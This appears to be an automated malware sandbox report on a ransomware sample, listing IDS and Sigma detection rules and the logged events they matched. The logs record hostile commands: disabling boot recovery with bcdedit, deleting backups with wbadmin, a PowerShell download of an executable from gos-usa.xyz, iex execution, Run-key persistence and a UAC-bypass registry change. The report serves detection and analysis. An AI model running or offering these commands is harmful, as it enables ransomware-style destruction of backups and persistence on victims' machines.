crowdsourced_ids_results.rule_msg: ET HUNTING SUSPICIOUS Firesale gTLD EXE DL with no Referer June 13 2016
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET HUNTING SUSPICIOUS Firesale gTLD EXE DL with no Referer June 13 2016"; flow:established,to_server; http.uri; content:".exe"; nocase; fast_pattern; http.host; pcre:"/\.(?:s(?:(?:(?:cien|pa)c|it)e|tream)|c(?:l(?:ick|ub)|ountry|ricket)|m(?:(?:aiso|e)n|o(?:bi|m))|p(?:r(?:ess|o)|arty|ink|w)|r(?:e(?:[dn]|view)|acing)|w(?:eb(?:site|cam)|in)|b(?:(?:outiq|l)ue|id)|d(?:ownload|ate|esi)|(?:accountan|hos)t|l(?:o(?:an|l)|ink)|t(?:rade|ech|op)|v(?:oyage|ip)|g(?:dn|b)|online|faith|kim|xyz)(?:\x3a\d{1,5})?$/"; http.header_names; content:!"Referer"; content:!"Cookie"; classtype:trojan-activity; sid:2022896; rev:7; metadata:created_at 2016_06_14, performance_impact Moderate, confidence Medium, signature_severity Major, updated_at 2024_04_22, reviewed_at 2024_04_11;)

crowdsourced_ids_results.rule_msg: ET MALWARE Terse alphanumeric executable downloader high likelihood of being hostile
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET MALWARE Terse alphanumeric executable downloader high likelihood of being hostile"; flow:established,to_server; http.uri; content:"/"; content:".exe"; distance:1; within:8; fast_pattern; endswith; pcre:"/\/[A-Z]?[a-z]{1,3}[0-9]?\.exe$/"; http.header; content:!"koggames"; http.host; content:!"download.bitdefender.com"; endswith; content:!".appspot.com"; endswith; content:!"kaspersky.com"; endswith; content:!".sophosxl.net"; endswith; http.header_names; content:!"Referer"; nocase; classtype:bad-unknown; sid:2019714; rev:13; metadata:created_at 2014_11_15, performance_impact Significant, confidence Medium, signature_severity Informational, updated_at 2024_04_22;)

crowdsourced_ids_results.rule_msg: ET INFO Windows Powershell User-Agent Usage
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO Windows Powershell User-Agent Usage"; flow:established,to_server; http.user_agent; content:"Mozilla/"; startswith; content:") WindowsPowerShell/"; distance:0; fast_pattern; classtype:not-suspicious; sid:2033355; rev:1; metadata:attack_target Client_Endpoint, created_at 2021_07_16, deployment Perimeter, confidence High, signature_severity Informational, updated_at 2021_07_16;)

crowdsourced_ids_results.rule_msg: ET INFO Request for EXE via Powershell
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO Request for EXE via Powershell"; flow:established,to_server; http.method; content:"GET"; http.uri; content:".exe"; endswith; nocase; http.user_agent; content:"WindowsPowerShell/"; fast_pattern; reference:md5,38135f6de7042fa63df183671b09a5ee; classtype:misc-activity; sid:2043337; rev:2; metadata:attack_target Client_and_Server, created_at 2023_01_19, deployment Perimeter, confidence High, signature_severity Informational, updated_at 2023_04_20;)

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

sigma_analysis_results.rule_description: Detects WannaCry ransomware activity
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Tom U. @c_APT_ure (collection), oscd.community, Jonhnathan Ribeiro

match_context.values: @{Hashes=MD5=9C7E9CFC13C52CA9BD160CB6887CD2F5,SHA256=5AD1DDC85AF5100665486B0666EC36C21EF08A55D3CBE0E2BAD3746F44DF363D,IMPHASH=ED47BFF4333B75903582989F6C229A64; CurrentDirectory=C:\Users\Bruno\AppData\Local\6BA6D568-E88A-E7D6-EEFA-19C0A66EABCC\; OriginalFileName=bcdedit.exe; Product=Microsoft\xae Windows\xae Operating System; Description=Boot Configuration Data Editor; FileVersion=10.0.19041.1202 (WinBuild.160101.0800); ParentCommandLine="C:\Users\Bruno\AppData\Local\6BA6D568-E88A-E7D6-EEFA-19C0A66EABCC\browser.exe" ; CommandLine=bcdedit.exe /set {default} recoveryenabled no; EventID=1; ParentImage=C:\Users\Bruno\AppData\Local\6BA6D568-E88A-E7D6-EEFA-19C0A66EABCC\browser.exe; IntegrityLevel=High; Image=C:\Windows\System32\bcdedit.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects the execution of a Windows system binary that is usually located in the system folder from an uncommon location.
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Patrick Bareiss, Anton Kutepov, oscd.community, Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{CommandLine=C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -c iex ([io.file]::ReadAllText($env:0)); Image=C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe; EventID=1}

sigma_analysis_results.rule_description: Detects the use of the bcdedit command to tamper with the boot configuration data. This technique is often times used by malware or attackers as a destructive way before launching ransomware.
sigma_analysis_results.rule_author: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\AppData\Local\6BA6D568-E88A-E7D6-EEFA-19C0A66EABCC\; OriginalFileName=bcdedit.exe; Hashes=MD5=9C7E9CFC13C52CA9BD160CB6887CD2F5,SHA256=5AD1DDC85AF5100665486B0666EC36C21EF08A55D3CBE0E2BAD3746F44DF363D,IMPHASH=ED47BFF4333B75903582989F6C229A64; Description=Boot Configuration Data Editor; EventID=1; ParentCommandLine="C:\Users\Bruno\AppData\Local\6BA6D568-E88A-E7D6-EEFA-19C0A66EABCC\browser.exe" ; CommandLine=bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures; FileVersion=10.0.19041.1202 (WinBuild.160101.0800); ParentImage=C:\Users\Bruno\AppData\Local\6BA6D568-E88A-E7D6-EEFA-19C0A66EABCC\browser.exe; IntegrityLevel=High; Image=C:\Windows\System32\bcdedit.exe; Company=Microsoft Corporation}

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\AppData\Local\6BA6D568-E88A-E7D6-EEFA-19C0A66EABCC\; OriginalFileName=bcdedit.exe; Hashes=MD5=9C7E9CFC13C52CA9BD160CB6887CD2F5,SHA256=5AD1DDC85AF5100665486B0666EC36C21EF08A55D3CBE0E2BAD3746F44DF363D,IMPHASH=ED47BFF4333B75903582989F6C229A64; Description=Boot Configuration Data Editor; EventID=1; ParentCommandLine="C:\Users\Bruno\AppData\Local\6BA6D568-E88A-E7D6-EEFA-19C0A66EABCC\browser.exe" ; CommandLine=bcdedit.exe /set {default} recoveryenabled no; FileVersion=10.0.19041.1202 (WinBuild.160101.0800); ParentImage=C:\Users\Bruno\AppData\Local\6BA6D568-E88A-E7D6-EEFA-19C0A66EABCC\browser.exe; IntegrityLevel=High; Image=C:\Windows\System32\bcdedit.exe; Company=Microsoft Corporation}

match_context.values: @{Hashes=MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7; CurrentDirectory=C:\Users\Bruno\AppData\Local\6BA6D568-E88A-E7D6-EEFA-19C0A66EABCC\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine="C:\Users\Bruno\AppData\Local\6BA6D568-E88A-E7D6-EEFA-19C0A66EABCC\browser.exe" ; CommandLine=powershell.exe -ExecutionPolicy Bypass "Get-VM | Select-Object vmid | Get-VHD | %%{Get-DiskImage -ImagePath $_.Path; Get-DiskImage -ImagePath $_.ParentPath} | Dismount-DiskImage"; EventID=1; ParentImage=C:\Users\Bruno\AppData\Local\6BA6D568-E88A-E7D6-EEFA-19C0A66EABCC\browser.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Shadow Copies Deletion Using Operating Systems Utilities
sigma_analysis_results.rule_description: Shadow Copies deletion using operating systems utilities
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Michael Haag, Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community, Andreas Hunkeler (@Karneades)

match_context.values: @{Hashes=MD5=F2AA55885A2C014DA99F1355F3F71E4A,SHA256=508E5F70C29502D7BA66A35959A327E3D658514496EE7B9155D95E7409EB4FB8,IMPHASH=D72A8A096458529EDF54E67F5F212651; CurrentDirectory=C:\Users\Bruno\AppData\Local\6BA6D568-E88A-E7D6-EEFA-19C0A66EABCC\; OriginalFileName=WBADMIN.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Command Line Interface for Microsoft\xae BLB Backup; FileVersion=10.0.19041.1202 (WinBuild.160101.0800); ParentCommandLine="C:\Users\Bruno\AppData\Local\6BA6D568-E88A-E7D6-EEFA-19C0A66EABCC\browser.exe" ; CommandLine=wbadmin.exe delete catalog -quiet; EventID=1; ParentImage=C:\Users\Bruno\AppData\Local\6BA6D568-E88A-E7D6-EEFA-19C0A66EABCC\browser.exe; IntegrityLevel=High; Image=C:\Windows\System32\wbadmin.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
Powerup tool's Write Hijack DLL exploits DLL hijacking for privilege escalation.
In it's default mode, it builds a self deleting .bat file which executes malicious command.
The detection rule relies on creation of the malicious bat file (debug.bat by default).

match_context.values: @{Image=C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Windows\Temp\APack.bat; EventID=11}
@{Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Windows\Temp\APack.bat; EventID=11}

sigma_analysis_results.rule_description: Detects the shell open key manipulation (exefile and ms-settings) used for persistence and the pattern of UAC Bypass using fodhelper.exe, computerdefaults.exe, slui.exe via registry keys (e.g. UACMe 33 or 62)

match_context.values: @{RuleName=T1042; Details="%%1" %%*; EventID=13; Image=C:\Users\Bruno\AppData\Local\Temp\7ZipSfx.000\enc-build.exe; EventType=SetValue; TargetObject=HKU\S-1-5-21-4005801669-2598574594-602355426-1001_Classes\exefile\shell\open\command\(Default)}

@{RuleName=T1042; Details="%%1" %%*; EventID=13; Image=C:\Users\Bruno\AppData\Local\6BA6D568-E88A-E7D6-EEFA-19C0A66EABCC\browser.exe; EventType=SetValue; TargetObject=HKU\S-1-5-21-4005801669-2598574594-602355426-1001_Classes\exefile\shell\open\command\(Default)}

sigma_analysis_results.rule_description: Detects process creation events that use the Sysnative folder (common for CobaltStrike spawns)

match_context.values: @{Hashes=MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7; CurrentDirectory=C:\Users\Bruno\AppData\Local\Temp\7ZipSfx.000\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine=C:\Windows\system32\cmd.exe /c ""C:\Users\Bruno\AppData\Local\Temp\7ZipSfx.000\setup.cmd" "; CommandLine=C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe  -nop -c iex ([io.file]::ReadAllText($env:0)); FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentImage=C:\Windows\SysWOW64\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}
@{CommandLine=C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -c iex ([io.file]::ReadAllText($env:0)); Image=C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe; EventID=1}

sigma_analysis_results.rule_description: A General detection for files being created in the Windows startup directory. This could be an indicator of persistence.

match_context.values: @{RuleName=T1023; Image=C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\Bruno\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\App.url; EventID=11}
@{Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\Bruno\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\App.url}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values: @{ScriptBlockText=Invoke-WebRequest -Uri 'http://gos-usa.xyz/u1.exe' -OutFile 'C:\Users\Bruno\AppData\Local\Temp\Updater.exe';; MessageTotal=1; ScriptBlockId=465551cd-2ff2-4add-bed7-dc2062db101c; Path=; MessageNumber=1; EventID=4104}

@{ScriptBlockText=Invoke-WebRequest -Uri 'http://gos-usa.xyz/u1.exe' -OutFile 'C:\Users\Bruno\AppData\Local\Temp\Updater.exe';; Path=; ScriptBlockId=a67b341b-902b-4a64-9e0a-aec6f74f3f3e; MessageTotal=1; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_description: Detects registry modifications that disable internal tools or functions in explorer (malware like Agent Tesla uses this technique)

match_context.values: @{Details=DWORD (0x00000001); EventID=13; EventType=SetValue; TargetObject=SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose}

sigma_analysis_results.rule_description: Detects when when a mounted share is removed. Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation

match_context.values:
@{ScriptBlockText=
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT/Microsoft/Windows/Storage/MSFT_FileShare'
$script:ClassVersion = ''
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export [TRUNCATED]; Path=; ScriptBlockId=9e46d2be-d978-4207-a4fb-ade324ea1994; MessageTotal=4; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_title: Disable Internal Tools or Feature in Registry
sigma_analysis_results.rule_description: Detects registry modifications that change features of internal Windows tools (malware like Agent Tesla uses this technique)

match_context.values: @{EventType=SetValue; Details=DWORD (0x00000000); EventID=13; TargetObject=SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\shutdownwithoutlogon}
@{EventType=SetValue; EventID=13; Details=DWORD (0x00000001); TargetObject=SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\StartMenuLogOff}

sigma_analysis_results.rule_description: Detects modification of autostart extensibility point (ASEP) in registry.
sigma_analysis_results.rule_author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)

match_context.values: @{RuleName=T1060,RunKey; EventType=SetValue; Details="C:\Users\Bruno\AppData\Local\6BA6D568-E88A-E7D6-EEFA-19C0A66EABCC\browser.exe" ; Image=C:\Users\Bruno\AppData\Local\Temp\7ZipSfx.000\enc-build.exe; EventID=13; TargetObject=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\browser}

sigma_analysis_results.rule_description:
Detects the deletion of backups or system state backups via "wbadmin.exe".
This technique is used by numerous ransomware families and actors.
This may only be successful on server platforms that have Windows Backup enabled.

sigma_analysis_results.rule_title: Potential Binary Or Script Dropper Via PowerShell

Start-Sleep -Seconds 5
